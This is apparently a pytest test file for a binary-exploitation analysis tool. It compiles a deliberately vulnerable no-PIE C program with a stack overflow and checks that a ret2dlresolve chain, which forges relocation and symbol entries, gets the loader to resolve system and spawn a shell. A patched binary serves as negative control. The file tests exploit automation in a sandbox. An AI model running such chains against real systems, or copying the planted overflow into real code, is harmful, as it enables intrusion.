"""ret2dlresolve: call system("/bin/sh") with NO libc leak and NO `system` PLT entry, by forging
the Elf64_Rela + Elf64_Sym + symbol string the dynamic linker resolves. The forged structures come
from the TARGET binary's own tables, so the technique works against whatever loader the target runs
under (older air-gap glibc included). x86-64, no-PIE, lazily bound (partial RELRO)."""
import shutil
import struct
import subprocess

import pytest
from lykos.analyze.dynamic import sandbox
from lykos.analyze.poc import leak, rop

pytestmark = pytest.mark.skipif(
    sandbox.host_arch() != "x86-64" or not shutil.which("gcc"),
    reason="ret2dlresolve fixture + detonation are native x86-64 only")


def _dl_src(read_call: str) -> str:
    """A no-PIE, lazily-bound target: imports read (no system), supplies pop rdi/rsi/rdx gadgets and
    a .bss scratch. Parameterised ONLY by the read that owns the overflow, so the positive and its
    negative control are byte-identical but for that call (supwngo _90_neg discipline)."""
    return (
        '#include <unistd.h>\n#include <stdio.h>\n'
        'char scratch[0x400];\n'
        '__asm__(".text\\n"\n'
        '  ".global grdi\\n grdi: pop %rdi\\n ret\\n"\n'
        '  ".global grsi\\n grsi: pop %rsi\\n ret\\n"\n'
        '  ".global grdx\\n grdx: pop %rdx\\n ret\\n");\n'
        'void vuln(void){ char b[32]; ' + read_call + '; }\n'
        'int main(void){ setvbuf(stdout,0,2,0); vuln(); return 0; }\n')


def _build(tmp_path_factory, name, read_call):
    gcc = shutil.which("gcc") or shutil.which("cc")
    d = tmp_path_factory.mktemp(name)
    (d / "v.c").write_text(_dl_src(read_call))
    exe = d / "v"
    # -z lazy: keep PLT resolution lazy so the resolver can be reached (the air-gap common case)
    if subprocess.run([gcc, "-no-pie", "-fno-stack-protector", "-z", "lazy", "-w",
                       str(d / "v.c"), "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("cannot build ret2dlresolve fixture")
    return exe


@pytest.fixture
def dl_bin(tmp_path_factory):
    return _build(tmp_path_factory, "dl", "read(0,b,512)")            # overflow: the bug


@pytest.fixture
def dl_safe_bin(tmp_path_factory):
    return _build(tmp_path_factory, "dl_safe", "read(0,b,sizeof b)")  # bounds-fixed: no bug


# ---------------------------------------------------------------- pure primitive (deterministic)
def test_section_addr_reads_vaddrs():
    data = b"\x7fELF" + b"\x00" * 60           # malformed -> None, never raises
    assert rop.section_addr(data, ".bss") is None


def test_has_bind_now_distinguishes_relro(dl_bin, tmp_path_factory):
    # the lazily-bound fixture: the resolver is reachable, so dlresolve applies
    assert rop.has_bind_now(dl_bin.read_bytes()) is False
    # a -z now (full RELRO) build of the same source binds eagerly -> no lazy resolver to abuse
    gcc = shutil.which("gcc") or shutil.which("cc")
    d = tmp_path_factory.mktemp("now")
    (d / "v.c").write_text(_dl_src("read(0,b,512)"))
    now = d / "v"
    if subprocess.run([gcc, "-no-pie", "-fno-stack-protector", "-z", "now", "-w",
                       str(d / "v.c"), "-o", str(now)], capture_output=True).returncode == 0:
        assert rop.has_bind_now(now.read_bytes()) is True


def test_build_ret2dlresolve_forges_aligned_structures(dl_bin):
    data = dl_bin.read_bytes()
    jmprel = rop.section_addr(data, ".rela.plt"); symtab = rop.section_addr(data, ".dynsym")
    strtab = rop.section_addr(data, ".dynstr"); bss = rop.section_addr(data, ".bss")
    chain, fake = rop.build_ret2dlresolve(
        40, read_plt=rop.resolve_plt(str(dl_bin), "read"), plt0=rop.section_addr(data, ".plt"),
        pop_rdi=rop.find_gadget(data, "pop_rdi"), pop_rsi=rop.find_gadget(data, "pop_rsi"),
        pop_rdx=rop.find_gadget(data, "pop_rdx"), ret_gadget=rop.find_gadget(data, "ret"),
        jmprel=jmprel, symtab=symtab, strtab=strtab, scratch=bss, align=True)
    assert chain.startswith(b"A" * 40) and b"system\x00" in fake and b"/bin/sh\x00" in fake
    # the forged Rela carries a JUMP_SLOT type (r_info low 32 bits == 7) and sits on the .rela.plt
    # 24-byte grid, so the reloc index the loader multiplies out is an exact integer
    found = any((bss + i - jmprel) % 24 == 0
                and (struct.unpack_from("<Q", fake, i + 8)[0] & 0xFFFFFFFF) == 7
                for i in range(0, len(fake) - 16, 8))
    assert found, "no JUMP_SLOT relocation forged on the .rela.plt grid"


# ---------------------------------------------------------------- live (spawns a real shell)
def test_ret2dlresolve_spawns_a_shell(dl_bin):
    """End-to-end: a no-PIE binary importing only read (no system, no /bin/sh) is driven to a real
    shell purely by forging the relocation the loader resolves -- confirmed by the forgery-proof
    marker (a crash, a wrong address or a reflected input can never evaluate it)."""
    data = dl_bin.read_bytes()
    res = leak.ret2dlresolve(
        dl_bin, dl_bin.parent, offset=40, read_plt=rop.resolve_plt(str(dl_bin), "read"),
        plt0=rop.section_addr(data, ".plt"), pop_rdi=rop.find_gadget(data, "pop_rdi"),
        pop_rsi=rop.find_gadget(data, "pop_rsi"), pop_rdx=rop.find_gadget(data, "pop_rdx"),
        ret_gadget=rop.find_gadget(data, "ret"), jmprel=rop.section_addr(data, ".rela.plt"),
        symtab=rop.section_addr(data, ".dynsym"), strtab=rop.section_addr(data, ".dynstr"),
        scratch=rop.section_addr(data, ".bss"), timeout=8.0)
    assert res["ok"], f"ret2dlresolve did not confirm a shell: {res.get('reason')}"
    assert res["align"] in (False, True) and res["reloc_symbol"] == b"system"


# ---------------------------------------------------------------- through the exploit stage
@pytest.fixture
def _stage(store):
    from lykos.analyze import register
    from lykos.jobs import JobConfig, WorkerPool
    register()
    p = WorkerPool(store.db_path, store.content, JobConfig(workers=2, poll_interval=0.02))
    p.start()
    try:
        yield p
    finally:
        p.stop(grace=3.0)


def _drive(store, pool, exe, *, offset=40):
    from lykos.analyze.ingest import enqueue_triage, ingest
    from lykos.analyze.poc import enqueue_exploit
    from lykos.db.dao import PocDAO, TargetDAO
    from lykos.jobs import JobQueue
    t = ingest(store, store.cases.create("dl").id, exe, filename="v")
    q = JobQueue(store.conn)
    enqueue_triage(q, t, force=True)
    assert pool.wait_idle(30)
    TargetDAO(store.conn).update_triage(t.id, arch="x86-64", bits=64, endianness="little",
                                        linking="dynamic", stripped=False,
                                        mitigations={"pie": "off"}, file_type="elf")
    run = enqueue_exploit(q, t, params={"strategy": "dlresolve", "offset": offset})
    assert pool.wait_idle(90) and q.runs.get(run.id).status == "done"
    return [pc for pc in PocDAO(store.conn).list_by_target(t.id)
            if pc.level == "L3" and pc.verified]


def test_exploit_stage_files_l3_ret2dlresolve(store, _stage, dl_bin):
    """The stage selects and confirms ret2dlresolve, filing an L3 PoC -- no leak, no system@plt."""
    assert _drive(store, _stage, dl_bin), "no confirmed L3 ret2dlresolve PoC"


def test_ret2dlresolve_declines_the_patched_target(store, _stage, dl_safe_bin):
    """Negative control (supwngo _90_neg): the SAME binary with the overflow removed must NOT yield
    a confirmed L3. Byte-identical but for the read length, same stage, same offset -- so a decline
    is the missing overflow alone (the gadgets, .bss and read import are all still present)."""
    assert not _drive(store, _stage, dl_safe_bin), "patched target wrongly credited an L3"
